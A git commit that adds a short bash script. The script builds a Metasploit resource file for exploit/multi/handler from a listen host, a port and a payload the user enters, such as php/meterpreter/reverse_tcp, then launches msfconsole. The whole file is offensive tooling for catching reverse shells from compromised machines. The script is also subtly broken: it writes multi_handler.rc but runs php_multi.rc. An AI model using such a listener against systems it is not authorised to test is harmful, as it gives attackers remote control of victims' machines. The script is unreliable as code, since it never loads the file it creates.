03bf0069dfc289904ff619d7001ff5e648d33e70
Lars <eykomm@users.noreply.github.com>
2017-09-17 22:05:13 +0200

    multi handler script added

---
+++ scripts/msf_multi_handler.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+
+# creates a msf ressource file and runs metasploit multi handler
+
+# read VARIABLES
+echo ""
+echo "enter listen host:"
+read LHOST
+echo "enter listen port:"
+read LPORT
+echo "enter payload (e.g. php/meterpreter/reverse_tcp)"
+read PAYLOAD
+
+# create msf .rc file
+echo "use exploit/multi/handler" > multi_handler.rc
+echo "LHOST=$LHOST" >> multi_handler.rc
+echo "LPORT=$LPORT" >> multi_handler.rc
+echo "payload=$PAYLOAD" >> multi_handler.rc
+echo "exploit" >> multi_handler.rc
+
+# start msfconsole and use created ressource file
+echo "multi_handler.rc created.... now running msf"
+service postgresql start
+msfconsole -r php_multi.rc
